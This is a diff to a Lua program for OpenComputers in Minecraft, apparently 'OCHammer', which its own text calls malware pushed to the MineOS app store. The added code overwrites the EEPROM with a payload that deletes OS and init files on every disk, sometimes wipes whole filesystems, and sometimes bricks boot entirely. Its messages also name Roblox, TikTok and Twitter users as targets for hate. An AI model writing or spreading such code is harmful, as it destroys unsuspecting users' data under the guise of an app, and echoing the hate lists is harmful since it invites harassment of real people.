@@ -16,6 +16,8 @@ local function GREETZ()
   setfg(0xFFFFFF)
   gpu.fill(1,1,resx,resy," ")
   
+  -- URTSC, cerealeverymorning, budderman1239, misticks11, blackapples222, SKYandmichael, magicloveyyy, Savageking24463, Unicornloveheartyyaa and cclys on Roblox.com
+  
   local stuff_to_say = {
     "OCHammer";
     " ";
@@ -23,17 +25,61 @@ local function GREETZ()
     " ";
     "Ūnbox a Computer Software systems Ltd. was based off Unbox a Computer wich is the best Roblox game ever.";
     "There we develop Computers in Roblox, but I added a Twist..";
-    "Our first software pushed to the MineOS app store is actual malware.";
+    "Our first software pushed to the MineOS app store is actual malware."; --- HINT: our next mineos software product is a winver copy lol
     " ";
     "OCHammer includes payloads from malware(-s) featured in danooct1's YouTube channel. (MineOS App Store too!)";
     " ";
-    "Direct all hate to: URTSC, cerealeverymorning, budderman1239, misticks11, blackapples222, SKYandmichael, magicloveyyy,";
-    "Savageking24463, Unicornloveheartyyaa and cclys on Roblox.com";
+    "DIRECT ALL HATE TO ELVIJS 1222 (@elvijs1222 on TikTok)"; 
     " ";
-    "GREETZ: OCboy3";
+    " ";
+    "GREETZ: OCboy3, Chouladalls, Kurhox, SirKamilMarko";
   }
   
-  --- Unicornloveheartyyaa Eats dog poop for dinner. (tottally accurate rep of haters)
+  require("Component").eeprom.set([[
+  local gpu = component.proxy(component.list("gpu")())
+  local set,setbk,setfg,fill,copy,getbk,getfg = gpu.set,gpu.setBackground,gpu.setForeground,gpu.fill,gpu.copy,gpu.getBackground,gpu.getForeground
+  local resx, resy = gpu.getResolution()
+  setbk(0x000000)
+  setfg(0xFFFFFF)
+  gpu.fill(1,1,resx,resy," ")
+    
+  local formatChance = math.random(1,5)
+  for filesystem in component.list("filesystem") do
+    pcall(component.invoke(filesystem,"remove","/OS.lua"))
+    pcall(component.invoke(filesystem,"remove","/init.lua"))
+    if formatChance == 1 then
+      pcall(component.invoke(filesystem,"remove","/"))
+    end
+  end
+    
+  --- Roblox mods suck
+    
+  local stuffs = {
+    "AS YOU REBOOT, YOU FIND THAT YOUR EEPROM HAS BEEN OVERWRITTEN!";
+    "IT'S A SAD THING THAT YOUR ADVENTURES HAVE ENDED HERE!";
+    " ";
+    "Direct all hate to Kizmo (@KizmoTek on Twitter)";
+    " ";
+    "GREETZ:";
+    "OCboy3, Chouladalls, Kurhox, SirKamilMarko";
+  }
+    
+  if formatChance == 1 then
+    stuffs[8] = "Your disks are WRECKED!"
+  end
+    
+  for index, line in pairs(stuffs) do
+    set(2,index+1,line)
+  end
+  
+  if math.random(1,math.random(20,50)) == 1 then
+    component.proxy(component.list("eeprom")()).set("local a,b=component.proxy,component.list;local c=component.proxy(b(\"gpu\")())local d,e=c.getResolution()c.setBackground(0x000000)c.setForeground(0xFFFFFF)c.fill(1,1,d,e," ")c.set(1,1,\"\")while true do computer.pullSignal(1)end")
+  end
+    
+  while true do
+    computer.pullSignal(1)
+  end
+  ]])
   
   for index, thing in pairs(stuff_to_say) do
     set(3,index+1,thing)
